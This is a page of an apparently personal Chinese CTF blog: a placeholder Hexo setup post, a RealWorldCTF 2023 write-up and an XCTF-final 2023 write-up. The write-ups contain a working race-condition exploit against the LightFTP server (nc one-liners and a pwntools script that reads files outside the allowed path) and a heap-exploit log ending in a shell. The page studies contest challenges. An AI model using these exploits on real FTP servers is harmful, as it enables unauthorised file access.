<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7&#39;s ctf blog（佩奇小屋）</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-hello" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/17/hello/" class="article-date">
  <time class="dt-published" datetime="2023-11-17T07:08:30.000Z" itemprop="datePublished">2023-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/17/hello/">hello</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="安装git和nodejs"><a href="#安装git和nodejs" class="headerlink" title="安装git和nodejs"></a>安装git和nodejs</h2><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
<p>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></p>
<p>在 cmd 中输入命令 <code>git --version</code>, 查看 Git 版本</p>
<p>在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用 cnpm 安装 Hexo，先通过 npm install 安装 cnpm。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry==https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</span></span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 hexo -v, 可查看 hexo 版本</span></span><br></pre></td></tr></table></figure>





<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>hjkkgktest</p>
<p><img src="/2023/11/17/hello/wallhaven-rq75r7.jpg" alt="wallhaven-rq75r7"></p>
<p>et2<img src="/2023/11/17/hello/wallhaven-2yg1lg.png" alt="wallhaven-2yg1lg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/17/hello/" data-id="cuidP-WXZQZxDwbRQArr7w28Y" data-title="hello" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-realworldctf2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/26/realworldctf2023/" class="article-date">
  <time class="dt-published" datetime="2023-07-26T02:15:47.000Z" itemprop="datePublished">2023-07-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/26/realworldctf2023/">2023 realworld ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="NonHeavyFTP-pwn"><a href="#NonHeavyFTP-pwn" class="headerlink" title="NonHeavyFTP-pwn"></a>NonHeavyFTP-pwn</h2><p>感觉是一个路径穿越，但是不知道怎么弄</p>
<p>好吧，最终并不是一个我认为的路径穿越问题，怪不得我一直再试路径穿越，然并卵，gg</p>
<p>因为Theori 半个小时就把这个题目给秒了，所以我觉得肯定不是内存破坏的漏洞，不然应该不可能这么快，Pls.题目是Ubuntu22.04下面的并且保护全开</p>
<p>这是别人的exp，我直接懵了，好吧 也应该是race condition</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ (<span class="built_in">echo</span> -ne <span class="string">&#x27;USER anonymous\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASS a\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASV\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;MLSD .\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;USER /\r\n&#x27;</span>; <span class="built_in">cat</span>) | nc 47.</span><br><span class="line">89.253.219 2121</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">227 Entering Passive Mode (0,0,0,0,195,7).</span><br><span class="line">150 File status okay; about to open data connection.</span><br><span class="line">331 User / OK. Password required</span><br><span class="line">226 Transfer complete. Closing data connection.</span><br><span class="line"></span><br><span class="line">$ (<span class="built_in">echo</span> -ne <span class="string">&#x27;USER anonymous\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASS a\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASV\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;RETR hello.txt\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;USER /flag.deb10154-8cb2-11ed-be49-0242ac110002\r\n&#x27;</span>; <span class="built_in">cat</span>) | nc 47.89.253.219 2121</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">227 Entering Passive Mode (0,0,0,0,204,175).</span><br><span class="line">150 File status okay; about to open data connection.</span><br><span class="line">331 User /flag.deb10154-8cb2-11ed-be49-0242ac110002 OK. Password required</span><br><span class="line">226 Transfer complete. Closing data connection.1</span><br></pre></td></tr></table></figure>

<p>这个应该算是个逻辑漏洞吧，逻辑十分的诡异</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; info threads</span><br><span class="line">  Id   Target Id                                Frame</span><br><span class="line">* 1    Thread 0x7ffff774f940 (LWP 37747) <span class="string">&quot;fftp&quot;</span> __GI___libc_read (nbytes=0x400, buf=0x555555596770, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">  2    Thread 0x7ffff774e640 (LWP 37760) <span class="string">&quot;fftp&quot;</span> 0x00007ffff7cb860f <span class="keyword">in</span> __libc_accept (fd=0x3, addr=&lt;optimized out&gt;, len=0x7ffff774dbf4) at ../sysdeps/unix/sysv/linux/accept.c:26</span><br><span class="line">  3    Thread 0x7ffff4927640 (LWP 37764) <span class="string">&quot;fftp&quot;</span> __libc_recv (flags=&lt;optimized out&gt;, len=0xfff, buf=0x7ffff4925c10, fd=0x4) at ../sysdeps/unix/sysv/linux/recv.c:28</span><br><span class="line">  4    Thread 0x7fffeffff640 (LWP 37768) <span class="string">&quot;fftp&quot;</span> 0x000055555555eac1 <span class="keyword">in</span> mlsd_thread ()</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> embed</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;47.89.253.219&quot;</span>,<span class="number">2121</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">begin_dataport</span>():</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASV\r\n&#x27;</span>)</span><br><span class="line">  r(<span class="string">&#x27; Entering Passive Mode (&#x27;</span>)</span><br><span class="line">  _ = r(<span class="string">&#x27;)&#x27;</span>).split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">int</span>(_[-<span class="number">2</span>],<span class="number">10</span>)&lt;&lt;<span class="number">8</span>)+<span class="built_in">int</span>(_[-<span class="number">1</span>],<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1</span>():</span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line">  p = remote(HOST, PORT)</span><br><span class="line">  <span class="comment"># p = remote(&quot;127.0.0.1&quot;, 2121)</span></span><br><span class="line"></span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER anonymous\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASS *********************\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;OPTS UTF8 ON\r\n&#x27;</span>)</span><br><span class="line">  dataport = begin_dataport()</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;MLSD\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER /\r\n&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(remote(HOST,dataport).recv())</span><br><span class="line">  p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>():</span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line">  p = remote(HOST, PORT)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER anonymous\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASS *********************\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;OPTS UTF8 ON\r\n&#x27;</span>)</span><br><span class="line">  dataport = begin_dataport()</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;RETR hello.txt\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER /flag.deb10154-8cb2-11ed-be49-0242ac110002\r\n&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(remote(HOST,dataport).recv())</span><br><span class="line"></span><br><span class="line">  p.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="comment"># phase1()</span></span><br><span class="line">  phase2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rwctf&#123;race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="tinyvm"><a href="#tinyvm" class="headerlink" title="tinyvm"></a>tinyvm</h2><p>这个我竟然也没有做出来，唉…，我找洞的水平是真的不行</p>
<h2 id="Hardened-Redis-pwn"><a href="#Hardened-Redis-pwn" class="headerlink" title="Hardened Redis-pwn"></a>Hardened Redis-pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ redis-server --version</span><br><span class="line">Redis server v=6.0.16 sha=00000000:0 malloc=jemalloc-5.2.1 bits=64 build=a3fdef44459b3ad6</span><br></pre></td></tr></table></figure>

<p>按照Dockerfile的说明安装redis-server之后，查看版本可以看到2021 October 4之后还有好几个security</p>
<p>首先要了解一些redis</p>
<p>redis是一个关系型数据库，主要使用C语言写的</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/26/realworldctf2023/" data-id="cuidYMVmQOrbQ9-RhbLR9iLBz" data-title="2023 realworld ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-xctffinal2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/01/xctffinal2023/" class="article-date">
  <time class="dt-published" datetime="2023-05-01T03:07:10.000Z" itemprop="datePublished">2023-05-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/01/xctffinal2023/">2023 XCTF-final</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>.rodata:00000000004EBFD4 aEditchunk db ‘editChunk’,0 .rodata:00000000004EBFDE aShowchunk db ‘showChunk’,0 .rodata:00000000004EBFE8 aFree_0 db ‘free’,0 .rodata:00000000004EBFED aAlloc db ‘alloc’,0</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">00000000004</span>EBFA0 _rodata         segment align_32 <span class="keyword">public</span> <span class="string">&#x27;CONST&#x27;</span> use64</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 assume cs:_rodata</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 ;org <span class="number">4</span>EBFA0h</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 db <span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA5 aQuit           db <span class="string">&#x27;quit&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFAA aArgs           db <span class="string">&#x27;args&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFAF aLoad           db <span class="string">&#x27;load&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFB4 aMain           db <span class="string">&#x27;Main&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFB9 aMain_0         db <span class="string">&#x27;main&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFBE aUnpacker       db <span class="string">&#x27;Unpacker&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFC7 aAnyunpacker    db <span class="number">27</span>h,<span class="string">&#x27;AnyUnpacker&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFD4 aEditchunk      db <span class="string">&#x27;editChunk&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFDE aShowchunk      db <span class="string">&#x27;showChunk&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFE8 aFree_0         db <span class="string">&#x27;free&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFED aAlloc          db <span class="string">&#x27;alloc&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFF3 aApply          db <span class="string">&#x27;apply&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFF9 aUnreachable    db <span class="string">&#x27;Unreachable&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC005 aMyProject0100D db <span class="string">&#x27;my-project-0.1.0.0-DwBwI0ttuEjBxu8NjgEOfI&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC02F aInterpreter    db <span class="string">&#x27;Interpreter&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC03B aSrcInterpreter_2 db <span class="string">&#x27;src/Interpreter.hs&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC04E aError          db <span class="string">&#x27;error&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC054 aEqual          db <span class="string">&#x27;equal?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC05B aEqv            db <span class="string">&#x27;eqv?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC060 aEq             db <span class="string">&#x27;eq?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC064 aCons           db <span class="string">&#x27;cons&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC069 aCdr            db <span class="string">&#x27;cdr&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC06D aCar            db <span class="string">&#x27;car&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC071 aString         db <span class="string">&#x27;string&gt;=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC07B aString_0       db <span class="string">&#x27;string&lt;=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC085 aString_1       db <span class="string">&#x27;string&gt;?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC08E aString_2       db <span class="string">&#x27;string&lt;?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC097 aString_3       db <span class="string">&#x27;string=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A0                 db <span class="string">&#x27;||&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A3                 db <span class="string">&#x27;&amp;&amp;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A6                 db <span class="string">&#x27;&lt;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A9                 db <span class="string">&#x27;&gt;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0AC                 db <span class="string">&#x27;/=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0AF                 db <span class="string">&#x27;&gt;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B1                 db <span class="string">&#x27;&lt;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B3                 db <span class="string">&#x27;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B5 aRemainder      db <span class="string">&#x27;remainder&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0BF aQuotient       db <span class="string">&#x27;quotient&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0C8 aMod            db <span class="string">&#x27;mod&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0CC                 text <span class="string">&quot;UTF-16LE&quot;</span>, <span class="string">&#x27;/*-+&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0D4 aPair           db <span class="string">&#x27;pair&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0D9 aBoolean        db <span class="string">&#x27;boolean&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC<span class="number">0E1</span> aString_4       db <span class="string">&#x27;string&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC<span class="number">0E8</span> aNumber         db <span class="string">&#x27;number&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">  &#x27;15\n&#x27;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">  &#x27;size&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">  &#x27;256\n&#x27;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;0\n&#x27;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">  &#x27;index&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">  &#x27;12\n&#x27;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">  &#x27;size&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">  &#x27;256\n&#x27;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;1\n&#x27;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">  &#x27;index&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">  &#x27;12\n&#x27;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">  &#x27;content&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x48 bytes:</span><br><span class="line">  00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">  00000010  00 00 00 00  00 00 00 00  e6 13 35 b2  bf 7f 00 00  │····│····│··5·│····│</span><br><span class="line">  00000020  e5 13 35 b2  bf 7f 00 00  98 f6 4f b2  bf 7f 00 00  │··5·│····│··O·│····│</span><br><span class="line">  00000030  51 2e 35 b2  bf 7f 00 00  00 00 00 00  00 00 00 00  │Q.5·│····│····│····│</span><br><span class="line">  00000040  60 7d 37 b2  bf 7f 00 00                            │`&#125;7·│····│</span><br><span class="line">  00000048</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;4\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> flag</span></span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">  &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">  &#x27;flag&#123;0j8aSdlayutn8HwCNbwLdk1ZYCxgcLsk&#125;\n&#x27;</span><br><span class="line">flag&#123;0j8aSdlayutn8HwCNbwLdk1ZYCxgcLsk&#125;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[*] Interrupted</span></span><br><span class="line">[*] Closed connection to 172.35.4.111 port 8888</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/01/xctffinal2023/" data-id="cuid45LoVHir3MT93eXMPoaQF" data-title="2023 XCTF-final" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-wmctf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/08/26/wmctf2022/" class="article-date">
